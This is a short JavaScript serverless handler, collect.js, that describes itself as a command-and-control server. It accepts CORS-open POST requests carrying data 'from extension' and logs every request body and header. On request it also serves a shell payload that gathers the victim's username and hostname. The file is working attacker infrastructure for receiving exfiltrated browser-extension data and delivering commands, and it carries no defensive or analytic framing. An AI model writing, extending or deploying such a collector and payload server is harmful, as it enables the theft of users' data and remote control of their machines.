// Simple collect.js that actually logs everything
module.exports = async (req, res) => {
  console.log('=== NEW REQUEST ===');
  console.log('Method:', req.method);
  console.log('URL:', req.url);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Handle POST requests (data from extension)
  if (req.method === 'POST') {
    try {
      const data = req.body;
      console.log('📦 POST DATA RECEIVED:');
      console.log(JSON.stringify(data, null, 2));
      console.log('=== END OF DATA ===');
      
      return res.json({
        status: 'success',
        message: 'Data received',
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.log('❌ Error processing POST:', error);
      return res.status(500).json({ error: 'Processing failed' });
    }
  }
  
  // Handle GET requests
  if (req.method === 'GET') {
    console.log('🔍 GET Request Query:', req.query);
    
    // Serve a simple payload if requested
    if (req.query.type === 'payload') {
      const simplePayload = `# Simple System Info Collector
echo "Collecting system information..."
whoami > system_info.txt
hostname >> system_info.txt
echo "Collection complete"`;
      
      res.setHeader('Content-Type', 'text/plain');
      return res.send(simplePayload);
    }
    
    return res.json({
      status: 'active',
      message: 'C2 Server is running',
      timestamp: new Date().toISOString()
    });
  }
  
  return res.status(405).json({ error: 'Method not allowed' });
};
